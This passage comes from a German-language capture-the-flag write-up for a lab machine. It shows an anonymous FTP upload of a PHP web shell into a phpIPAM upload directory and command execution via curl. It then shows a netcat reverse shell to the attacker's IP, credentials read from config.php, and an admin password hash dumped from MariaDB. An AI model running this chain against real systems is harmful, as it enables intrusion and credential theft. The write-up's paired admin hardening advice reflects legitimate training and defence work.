+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die weitere FTP-Enumeration führte mich zum Verzeichnis <code>/var/www/html/phpipam/app/admin/import-export/upload/</code>. Die Beobachtung, dass dieses Verzeichnis <code>drwxrwxrwx</code>-Berechtigungen (world-writable) aufweist, ist ein kritischer Fund. Das bedeutet, dass jeder Benutzer, einschließlich des anonymen FTP-Benutzers, hier Dateien hochladen kann. Dies ist ein idealer Punkt für den Initial Access, da ich hier eine Reverse Shell hochladen kann.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Entdeckung eines world-writable Upload-Verzeichnisses ist ein großer Erfolg für den initialen Zugriff. Solche Verzeichnisse sind klassische Schwachstellen, die direkt zur Kompromittierung des Systems führen können. Das Hochladen einer Reverse Shell in ein öffentlich zugängliches und ausführbares Verzeichnis ermöglicht mir, Code auf dem Server auszuführen. Ich habe eine einfache PHP-Reverse-Shell-Datei (`rev.php`) hochgeladen, um später eine Verbindung aufzubauen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen Sie bei FTP-Zugriffen immer nach world-writable Verzeichnissen, insbesondere in Webserver-Wurzeln. Dies ist ein direkter Weg zu einer Shell. Stellen Sie sicher, dass die hochgeladene Datei ausführbar ist, indem Sie die Berechtigungen (z.B. <code>chmod 777</code>) anpassen, falls erforderlich. <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie FTP-Verzeichnisse niemals mit world-writable Berechtigungen (<code>drwxrwxrwx</code> oder <code>777</code>). Implementieren Sie das Least Privilege Principle für alle Dateiberechtigungen. Upload-Verzeichnisse sollten niemals im Webserver-Dokumentenstamm liegen oder die Ausführung von Skripten erlauben. Nutzen Sie Dateiupload-Kontrollen und Virenscanner auf dem Server.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ftp 192.168.2.195</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Connected to <span class="command">192.168.2.195</span>.
+<span class="command">220 (vsFTPd 3.0.3)</span>
+Name (<span class="command">192.168.2.195:ccat</span>): <span class="password">anonymous</span>
+<span class="command">331 Please specify the password.</span>
+Password:
+<span class="command">230 Login successful.</span>
+Remote system type is <span class="command">UNIX</span>.
+Using <span class="command">binary</span> mode to transfer files.
+ftp> <span class="command">cd /var/www/html/phpipam/app/admin/import-export/upload/</span>
+<span class="command">250 Directory successfully changed.</span>
+ftp> <span class="command">ls -la</span>
+<span class="command">229 Entering Extended Passive Mode (|||26435|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxrwxrwx    2 33       33           4096 May 02  2022 .</span>
+<span class="command">drwxr-xr-x    3 33       33           4096 May 02  2022 ..</span>
+<span class="command">-rw-r--r--    1 33       33            259 May 02  2022 .htaccess</span>
+<span class="command">226 Directory send OK.</span>
+ftp> <span class="command">put rev.php</span>
+local: <span class="command">rev.php</span> remote: <span class="command">rev.php</span>
+<span class="command">229 Entering Extended Passive Mode (|||12383|)</span>
+<span class="command">150 Ok to send data.</span>
+<span class="command">100% |*************************************************|    31        1.47 MiB/s    00:00 ETA</span>
+<span class="command">226 Transfer complete.</span>
+<span class="command">31 bytes sent in 00:00 (94.30 KiB/s)</span>
+ftp>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die Reverse Shell (`rev.php`) auf den Server hochgeladen wurde, versuchte ich, sie über den Webbrowser aufzurufen, um ihre Ausführung zu testen. Zunächst probierte ich einen Parameter wie `page=tools§ion=../../../../../../tmp&cmd=id`, um zu sehen, ob eine Pfad-Traversierung oder Command Injection in anderen Bereichen der Anwendung möglich wäre. Dieses war jedoch nicht der Fall.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Meine ersten Versuche, eine Shell über Pfad-Traversierung oder Parameterinjektion zu erlangen, scheiterten und leiteten mich zur Login-Seite um. Dies zeigt, dass die phpipam-Anwendung möglicherweise einen robusten Schutz gegen solche Angriffe in den URL-Parametern implementiert hat oder dass die gewählten Pfade nicht zum gewünschten Ergebnis führten. Dies ist ein Rückschlag, aber es ist wichtig, alle möglichen Wege zu testen. Das System ist robust gegen einfache Pfad-Traversierung in dieser spezifischen URL.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie verschiedene Angriffsvektoren und Parameter, auch wenn ein Upload-Verzeichnis gefunden wurde. Manchmal gibt es alternative Wege zu einer Shell, oder der Upload ist eingeschränkt. Dokumentieren Sie sowohl erfolgreiche als auch fehlgeschlagene Versuche, um ein vollständiges Bild des Systems zu erhalten. <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie Whitelisting für URL-Parameter und verhindern Sie Pfad-Traversierung (Directory Traversal) durch strikte Eingabevalidierung. Stellen Sie sicher, dass Umleitungen auf Login-Seiten nur bei tatsächlicher Inaktivität oder fehlender Authentifizierung erfolgen und keine Informationslecks verursachen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://pam.hmv/phpipam/index.php?page=tools§ion=../../../../../../tmp&cmd=id</span>
+
+und alle anderen versuche landen auf der loginpage <span class="command">http://pam.hmv/phpipam/index.php?page=login</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach dem Fehlschlag des direkten Zugriffs über die URL-Parameter versuchte ich, mich auf der phpipam-Login-Seite mit den Anmeldedaten `phpipam`/`phpipamadmin` anzumelden, die ich möglicherweise in einer Konfigurationsdatei finden konnte (was in den nächsten Schritten bestätigt wird).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login-Versuch mit den gefundenen Anmeldedaten auf der phpipam-Login-Seite schlug fehl. Die Meldung "Invalid username or password" ist eindeutig. Dies bedeutet, dass die Anmeldedaten, auch wenn sie aus einer Konfigurationsdatei stammen könnten, nicht für die Weboberfläche selbst gültig sind oder dass der Benutzername/Passwort nicht dem entspricht, was ich angenommen habe. Dies ist ein weiterer Hinweis darauf, dass der direkte Shell-Zugriff über das zuvor hochgeladene Skript der vielversprechendste Weg ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer eine umfassende Aufklärung von Konfigurationsdateien durch, um alle potenziellen Anmeldeinformationen zu sammeln. Wenn Anmeldeversuche scheitern, prüfen Sie, ob die Anmeldeinformationen für einen anderen Dienst gedacht sind (z.B. Datenbank, SSH). <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie niemals Standard- oder Hardcoded-Anmeldedaten. Stellen Sie sicher, dass Anmeldedaten, die in Konfigurationsdateien gespeichert sind, nicht für Frontend-Login-Seiten wiederverwendet werden. Implementieren Sie eine sichere Passwortrichtlinie und Multi-Faktor-Authentifizierung für alle kritischen Systeme.
+            </p>
+            <img src="phpipam_login.jpg" alt="hier sieht man ein login versuch mit den gefundenen anmeldedaten auf der Loginseite">
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Please login
+<span class="password">Invalid username or password</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem der Login fehlschlug, überprüfte ich, ob die hochgeladene Reverse Shell `rev.php` überhaupt über den Webserver erreichbar war. Dies ist entscheidend, um zu wissen, ob der Upload-Pfad korrekt ist und der Webserver die Datei ausliefert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausgabe `404 Not Found` ist ein klares Zeichen dafür, dass die Datei `rev.php` nicht unter dem direkten Root-Pfad des Webservers (`http://pam.hmv/rev.php`) erreichbar ist. Dies ist nicht unerwartet, da ich die Datei in ein Unterverzeichnis (`/var/www/html/phpipam/app/admin/import-export/upload/`) hochgeladen habe. Es bestätigt jedoch, dass ich den vollen Pfad verwenden muss, um auf die Datei zuzugreifen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verifizieren Sie immer die Erreichbarkeit von hochgeladenen Dateien über den korrekten Webpfad. Manchmal sind die Dateipfade anders, als man erwartet, insbesondere bei komplexen Webanwendungen. <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie den Webserver so, dass sensitive Verzeichnisse oder Upload-Pfade nicht ohne weiteres zugänglich sind. Verwenden Sie Content Security Policies (CSP) und restriktive Apache/Nginx-Konfigurationen, um die Ausführung unbekannter Skripte zu verhindern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://pam.hmv/rev.php?cmd=id</span>
+
+<span class="password">404 Not Found</span>
+<span class="command">nginx/1.18.0</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Da der Login für die Webanwendung fehlschlug, habe ich die Suche nach Anmeldedaten in den heruntergeladenen Dateien intensiviert. Ich überprüfte die <code>config.php</code> von phpipam, da solche Dateien häufig Datenbank-Anmeldedaten enthalten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Voller Erfolg! In der <code>config.php</code> fand ich die Datenbank-Anmeldedaten: Benutzer `phpipam` und Passwort `phpipamadmin`. Dies ist eine sehr häufige Schwachstelle, da Datenbank-Anmeldedaten oft hartkodiert oder in leicht zugänglichen Konfigurationsdateien gespeichert sind. Dies wird für die weitere Enumeration des Systems und möglicherweise für eine Privilegien-Eskalation entscheidend sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Priorisieren Sie die Überprüfung von Konfigurationsdateien auf Anmeldedaten. Datenbank-Credentials sind oft ein wichtiger nächster Schritt, um interne Daten zu exfiltrieren oder weitere Schwachstellen zu finden. <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie niemals Datenbank-Anmeldedaten im Klartext in öffentlich zugänglichen Konfigurationsdateien. Verwenden Sie Umgebungsvariablen, Secrets Management-Systeme oder verschlüsselte Konfigurationsdateien. Trennen Sie Datenbankbenutzer nach dem Prinzip der geringsten Rechte.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat config.php</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="comment"> * database connection details
+ ******************************/</span>
+<span class="command">$db['host'] = '127.0.0.1';</span>
+<span class="command">$db['user'] = 'phpipam';</span>
+<span class="command">$db['pass'] = '<span class="password">phpipamadmin</span>';</span>
+<span class="command">$db['name'] = 'phpipam';</span>
+<span class="command">$db['port'] = 3306;</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die Datenbank-Anmeldedaten in der <code>config.php</code> gefunden hatte, war der nächste Schritt, die zuvor hochgeladene `rev.php` Datei zu testen, diesmal unter dem korrekten, vollständigen Pfad: `http://pam.hmv/phpipam/app/admin/import-export/upload/rev.php`. Ich versuchte erneut, den `id`-Befehl auszuführen, um zu sehen, ob die Datei korrekt vom Webserver interpretiert wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erste Versuch, die Shell über den korrekten Pfad auszuführen, scheiterte mit "Access denied." Dies deutete darauf hin, dass die hochgeladene Datei möglicherweise keine ausreichenden Dateiberechtigungen hatte, um ausgeführt zu werden, oder dass eine weitere Zugriffskontrolle im Webserver greift. Da ich jedoch FTP-Zugriff hatte, konnte ich die Dateiberechtigungen direkt ändern. Nachdem ich die Berechtigungen der <code>rev.php</code>-Datei über FTP mit <code>chmod 777 rev.php</code> auf vollständigen Lese-, Schreib- und Ausführungszugriff für alle Benutzer geändert hatte, führte der erneute Aufruf über <code>curl</code> zum Erfolg.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verifizieren Sie nach dem Upload von Dateien immer die korrekten Berechtigungen, insbesondere wenn es um die Ausführung von Skripten geht. Nutzen Sie Ihre etablierten Zugriffe (wie FTP), um diese bei Bedarf anzupassen. <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie FTP-Server so, dass Benutzer niemals die Dateiberechtigungen von hochgeladenen Dateien auf <code>777</code> setzen können. Implementieren Sie strikte Dateiberechtigungen auf dem gesamten System, insbesondere für Webserver-Verzeichnisse, um die Ausführung von unautorisiertem Code zu verhindern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -s http://pam.hmv/phpipam/app/admin/import-export/upload/rev.php?cmd=id</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Access denied.</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ftp> <span class="command">chmod 777 rev.php</span>
+<span class="command">200 SITE CHMOD command ok.</span>
+ftp></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -s http://pam.hmv/phpipam/app/admin/import-export/upload/rev.php?cmd=id</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die Ausführung von Befehlen über die hochgeladene Reverse Shell bestätigt hatte, war der nächste Schritt die Etablierung einer stabilen Reverse Shell. Ich nutzte den Befehl `nc -e /bin/bash 192.168.2.199 4444` in der `cmd`-URL-Parameter, um eine Verbindung zurück zu meinem angreifenden System auf Port 4444 herzustellen. Gleichzeitig startete ich einen Netcat-Listener auf meinem System.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Reverse Shell-Versuch war erfolgreich. Ich konnte eine Verbindung als Benutzer `www-data` aufbauen. Die Ausgabe des <code>id</code>-Befehls nach der Shell-Etablierung bestätigt die niedrigen Berechtigungen des Webserver-Benutzers. Dies ist der initiale Zugriff auf das System und ein entscheidender Erfolg. Von hier aus kann ich die interne Enumeration und die Suche nach Privilegien-Eskalationsmöglichkeiten beginnen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Etablieren Sie immer eine stabile Reverse Shell, sobald Code-Ausführung möglich ist. Verwenden Sie Tools wie Netcat oder Python, um eine Verbindung aufzubauen. Nach dem Initial Access sollte sofort eine detaillierte System-Enumeration erfolgen, um die nächste Eskalationsstufe zu finden. <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie Egress-Filterung auf Ihrer Firewall, um ausgehende Verbindungen von Webservern zu blockieren, es sei denn, sie sind explizit erlaubt. Dies kann Reverse Shells verhindern. Überwachen Sie ungewöhnliche Netzwerkaktivitäten von Webservern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -s http://pam.hmv/phpipam/app/admin/import-export/upload/rev.php?cmd=nc%20-e%20/bin/bash%20192.168.2.199%204444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command"></span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+listening on <span class="command">[any] 4444</span> ...
+connect to <span class="command">[192.168.2.199]</span> from <span class="command">(UNKNOWN) [192.168.2.195] 41428</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@pam:~/html/phpipam/app/admin/import-export/upload$ find / -type f -perm -4000 -ls 2>/dev/null</span>
+   <span class="command">133492     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp</span>
+   <span class="command">129905     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn</span>
+   <span class="command">134030     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /usr/bin/umount</span>
+   <span class="command">129909     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd</span>
+   <span class="command">133658     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /usr/bin/su</span>
+   <span class="command">134028     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /usr/bin/mount</span>
+   <span class="command">151048    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/bin/sudo</span>
+   <span class="command">129908     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd</span>
+   <span class="command">129906     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh</span>
+   <span class="command">136260     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   <span class="command">144261    472 -rwsr-xr-x   1 root     root         481608 Jul  2  2022 /usr/lib/openssh/ssh-keysign</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach dem initialen Zugriff als `www-data` ist die sofortige System-Enumeration der nächste Schritt. Ich suchte nach SUID-Binaries mit <code>find / -type f -perm -4000 -ls 2>/dev/null</code>, da diese oft als Vektor für Privilegien-Eskalation dienen können. Außerdem überprüfte ich offene Netzwerkports und Verbindungen mit <code>ss -altpn</code>, um interne Dienste und potenzielle Angriffsflächen zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die SUID-Scan-Ergebnisse zeigen Standard-Binaries wie `passwd`, `su`, `sudo` und `ssh-keysign`. Diese sind zwar häufig SUID, aber nicht sofort offensichtlich ausnutzbar ohne weitere Informationen (z.B. sudo-Konfiguration). Der `ss` Befehl zeigt, dass der MySQL-Server auf localhost (127.0.0.1:3306) lauscht, was meine zuvor gefundenen Datenbank-Anmeldedaten relevant macht. Der Nginx-Webserver lauscht auf Port 80. Zudem wird auf Port 12345 ein Dienst auf localhost gelauscht, dessen Zweck noch unklar ist. Dies ist eine wichtige Erkenntnis für die weitere Privilegien-Eskalation, da ich nun eine interne Datenbank und einen weiteren unbekannten Dienst ansteuern kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer umfassende Enumerationsschritte durch, sobald Sie eine Shell erhalten haben. Überprüfen Sie SUID-Binaries, offene Ports, laufende Dienste, Cronjobs und Dateiberechtigungen. Achten Sie auf ungewöhnliche oder nicht standardmäßige SUID-Binaries und interne Dienste. <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie Dateiberechtigungen so restriktiv wie möglich und entfernen Sie SUID-Berechtigungen von Binaries, wenn sie nicht absolut notwendig sind. Implementieren Sie das Least Privilege Principle für alle Benutzer und Dienste. Überwachen Sie interne Netzwerkaktivitäten und stellen Sie sicher, dass keine unbekannten oder ungenutzten Dienste auf dem System lauschen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@pam:~/html/phpipam/app/admin/import-export$ ss -altpn</span>
+State           Recv-Q          Send-Q                     Local Address:PORT                      Peer Address:PORT          Process
+<span class="command">LISTEN          0               80                             127.0.0.1:3306                           0.0.0.0:*</span>
+<span class="command">LISTEN          0               511                              0.0.0.0:80                             0.0.0.0:*              users:(("nginx",pid=452,fd=6),("nginx",pid=451,fd=6))</span>
+<span class="command">LISTEN          0               0                              127.0.0.1:12345                          0.0.0.0:*</span>
+<span class="command">LISTEN          0               511                                 [::]:80                                [::]:*              users:(("nginx",pid=452,fd=7),("nginx",pid=451,fd=7))</span>
+<span class="command">LISTEN          0               32                                     *:21                                   *:*</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit den zuvor gefundenen Datenbank-Anmeldedaten (`phpipam`/`phpipamadmin`) versuchte ich, mich über die `www-data`-Shell mit der MariaDB-Datenbank zu verbinden. Dies ist ein entscheidender Schritt, da Datenbanken oft sensible Informationen wie Benutzeranmeldedaten, Konfigurationen oder Geschäftsdaten enthalten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Verbindung zur MariaDB-Datenbank war erfolgreich! Ich konnte mich als Benutzer `phpipam` anmelden. Dies ist ein großer Erfolg, da ich nun vollständigen Zugriff auf die Datenbank habe. Das Auflisten der Datenbanken (`show databases;`) bestätigte die Existenz der `phpipam`-Datenbank. Durch das Wechseln zur `phpipam`-Datenbank (`use phpipam;`) und das Auflisten der Tabellen (`show tables;`) konnte ich die Tabelle `users` identifizieren. Der Befehl `select * from users;` holte alle Daten aus dieser Tabelle und zeigte den Benutzer `Admin` mit einem SHA512-gehashten Passwort.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie gefundene Datenbank-Anmeldedaten, um auf die Datenbank zuzugreifen. Priorisieren Sie die Suche nach Benutzer-, Konfigurations- und Passworttabellen. Versuchen Sie, Passworthashes zu knacken oder wiederzuverwenden. <br>
+                <strong>Empfehlung (Admin):</strong> Sichern Sie Datenbank-Anmeldedaten streng ab und verwenden Sie niemals Standardpasswörter. Implementieren Sie strenge Passwortrichtlinien und Multi-Faktor-Authentifizierung für Datenbankzugriffe. Verschlüsseln Sie sensible Daten in der Datenbank und überprüfen Sie die Passwort-Hashing-Methoden auf ihre Stärke.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@pam:~/html/phpipam/app/admin/import-export$ mysql -u phpipam -p</span>
+Enter password: <span class="password">phpipamadmin</span>
+<span class="command">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span>
+<span class="command">Your MariaDB connection id is 5</span>
+<span class="command">Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11</span>
+
+<span class="command">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span>
+
+<span class="command">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span>
+
+<span class="command">MariaDB [(none)]> show databases;</span>
+<span class="command">+--------------------+</span>
+<span class="command">| Database           |</span>
+<span class="command">+--------------------+</span>
+<span class="command">| information_schema |</span>
+<span class="command">| phpipam            |</span>
+<span class="command">+--------------------+</span>
+<span class="command">2 rows in set (0.001 sec)</span>
+
+<span class="command">MariaDB [(none)]> use phpipam;</span>
+<span class="command">Database changed</span>
+<span class="command">MariaDB [phpipam]> show tables;</span>
+<span class="command">+------------------------+</span>
+<span class="command">| Tables_in_phpipam      |</span>
+<span class="command">+------------------------+</span>
+<span class="command">| api                    |</span>
+<span class="command">| changelog              |</span>
+<span class="command">| circuitProviders       |</span>
+<span class="command">| circuitTypes           |</span>
+<span class="command">| circuits               |</span>
+<span class="comment">....</span>
+<span class="comment">...</span>
+<span class="comment">..</span>
+<span class="command">| users                  |</span>
+<span class="command">| usersAuthMethod        |</span>
+<span class="command">| vaultItems             |</span>
+<span class="command">| vaults                 |</span>
+<span class="command">| vlanDomains            |</span>
+<span class="command">| vlans                  |</span>
+<span class="command">| vrf                    |</span>
+<span class="command">| widgets                |</span>
+<span class="command">+------------------------+</span>
+<span class="command">46 rows in set (0.000 sec)</span>
+
+<span class="command">MariaDB [phpipam]> select * from users;</span>
+<span class="command">+----+----------+------------+------------------------------------------------------------------------------------------------------------------------+--------+---------------+---------------+--------------------+------------+------------------------------------------------------------------------------+------+-------------------+----------+------------+---------------+------------+---------------------+-----------+--------------+------------------+---------------+----------+-------------+-----+------------+-------+-------+-------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+</span>
+<span class="command">| id | username | authMethod | password                                                                                                               | groups | role          | real_name     | email              | domainUser | widgets                                                                      | lang | favourite_subnets | disabled | mailNotify | mailChangelog | passChange | editDate            | lastLogin | lastActivity | compressOverride | hideFreeRange | menuType | menuCompact | 2fa | 2fa_secret | theme | token | token_valid_until | module_permissions                                                                                                                                                     | compress_actions |</span>
+<span class="command">+----+----------+------------+------------------------------------------------------------------------------------------------------------------------+--------+---------------+---------------+--------------------+------------+------------------------------------------------------------------------------+------+-------------------+----------+------------+---------------+------------+---------------------+-----------+--------------+------------------+---------------+----------+-------------+-----+------------+-------+-------+-------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+</span>
+<span class="command">|  1 | Admin    |          1 | <span class="password">$6$rounds=3000$Y672yJoEz6tHHWfP$MrGLI9Dy1i1hLUjclLtaXD6DNepsl6E0.Se6vn71wxjSPy9y8LBiU9s9p0ntZFgPSA6z/zRQY4bQDsn.uteIO1</span> |        | Administrator | phpIPAM Admin | admin@domain.local | 0          | statistics;favourite_subnets;changelog;access_logs;error_logs;top10_hosts_v4 |    9 | NULL              | No       | No         | No            | No         | 2022-08-18 11:37:42 | NULL      | NULL         | default          |             0 | Dynamic  |           1 |   0 | NULL       |       | NULL  | NULL              | {"vlan":"1","l2dom":"1","vrf":"1","pdns":"1","circuits":"1","racks":"1","nat":"1","pstn":"1","customers":"1","locations":"1","devices":"1","routing":"1","vaults":"1"} |                1 |</span>
+<span class="command">+----+----------+------------+------------------------------------------------------------------------------------------------------------------------+--------+---------------+---------------+--------------------+------------+------------------------------------------------------------------------------+------+-------------------+----------+------------+---------------+------------+---------------------+-----------+--------------+------------------+---------------+----------+-------------+-----+------------+-------+-------+-------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+</span>
+<span class="command">1 row in set (0.002 sec)</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich den Hash des Benutzers `Admin` in der Datenbank gefunden hatte, musste ich ihn zunächst knacken. Ein SHA512-Hash ist zwar relativ sicher, kann aber mit Tools wie Hashcat oder John the Ripper und einer geeigneten Wortliste offline geknackt werden, insbesondere wenn es sich um ein häufig verwendetes oder schwaches Passwort handelt. Ich würde dies in meiner lokalen Kali-Umgebung tun. Danach musste ich die Benutzerverzeichnisse im <code>/home/</code>-Verzeichnis überprüfen, um eine mögliche horizontale Privilegien-Eskalation zu einem anderen Benutzer zu versuchen, da <code>www-data</code> sehr eingeschränkte Rechte hat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Benutzer `italia` wurde erfolgreich im <code>/home/</code>-Verzeichnis identifiziert. Obwohl der direkte FTP-Zugriff auf `user.txt` und `pazz.php` im Verzeichnis <code>/home/italia/</code> zuvor fehlschlug, ist die Möglichkeit einer horizontalen Eskalation zu diesem Benutzer `italia` sehr vielversprechend. Die weitere Analyse zeigte, dass `rev.php`, die PHP-Reverse-Shell, die ich auf den Webserver hochgeladen hatte, seltsamerweise auch im `anonymous`-Verzeichnis im `home`-Verzeichnis (`/home/anonymous/`) gelandet war. Dies ist eine interessante Beobachtung, die auf eine ungewöhnliche FTP-Konfiguration oder einen internen Link hindeutet, ist aber für unsere Zwecke weniger relevant, da der primäre Upload-Pfad auf dem Webserver bereits funktioniert. Wichtig ist jedoch, dass <code>pazz.php</code> eine executable-Flag hat. Dies ist ein wichtiger Hinweis. Die <code>user.txt</code>-Datei ist ebenfalls vorhanden, aber schreibgeschützt für den aktuellen Benutzer. Das Scheitern, die Dateien per FTP zu lesen, zeigt, dass ich andere Wege finden muss, um an die Inhalte zu kommen, insbesondere da <code>pazz.php</code> ausführbar ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie, Passworthashes zu knacken, um weitere Benutzerzugänge zu erhalten. Nutzen Sie dann die neuen Zugangsdaten, um eine horizontale Privilegien-Eskalation zu versuchen (z.B. mit <code>su</code> oder <code>ssh</code>). Prüfen Sie bei jedem neuen Benutzer die Berechtigungen sorgfältig. Untersuchen Sie ausführbare Dateien in Benutzerverzeichnissen immer genau. <br>
+                <strong>Empfehlung (Admin):</strong> Erzwingen Sie die Verwendung starker Passwörter und implementieren Sie robuste Hashing-Algorithmen (wie bcrypt oder Argon2) mit ausreichenden Iterationen. Stellen Sie sicher, dass Dateien mit sensiblen Informationen wie Passwörter nicht öffentlich lesbar sind, auch nicht für andere Systembenutzer. Überprüfen Sie, warum hochgeladene Dateien an unerwarteten Orten landen und korrigieren Sie die FTP-Server-Konfiguration.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@pam:~/html/phpipam/app/admin/import-export$ ls /home/</span>
+<span class="command">anonymous  italia</span>
+
+<span class="command">www-data@pam:~/html/phpipam/app/admin/import-export$ cd /home/anonymous/</span>
+<span class="command">www-data@pam:/home/anonymous$ ls -la</span>
+<span class="command">total 24</span>
+<span class="command">drwxr-xr-x 2 anonymous anonymous 4096 May 19 22:57 .</span>
+<span class="command">drwxr-xr-x 4 root      root      4096 Aug 18  2022 ..</span>
+<span class="command">-rw-r--r-- 1 anonymous anonymous  220 Aug 18  2022 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 anonymous anonymous 3526 Aug 18  2022 .bashrc</span>
+<span class="command">-rw-r--r-- 1 anonymous anonymous  807 Aug 18  2022 .profile</span>
+<span class="command">-rw------- 1 anonymous anonymous   31 May 19 22:57 rev.php</span>
+
+<span class="command">www-data@pam:/home/anonymous$ cd ../italia/</span>
+<span class="command">www-data@pam:/home/italia$ ls -la</span>
+<span class="command">total 48</span>
+<span class="command">drwxr-xr-x 3 italia italia 4096 Aug 18  2022 .</span>
+<span class="command">drwxr-xr-x 4 root   root   4096 Aug 18  2022 ..</span>
+<span class="command">-rw------- 1 italia italia   98 Aug 18  2022 .Xauthority</span>
+<span class="command">lrwxrwxrwx 1 italia italia    9 Aug 18  2022 .bash_history -> /dev/null</span>
+<span class="command">-rw-r--r-- 1 italia italia  220 Aug 18  2022 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 italia italia 3526 Aug 18  2022 .bashrc</span>
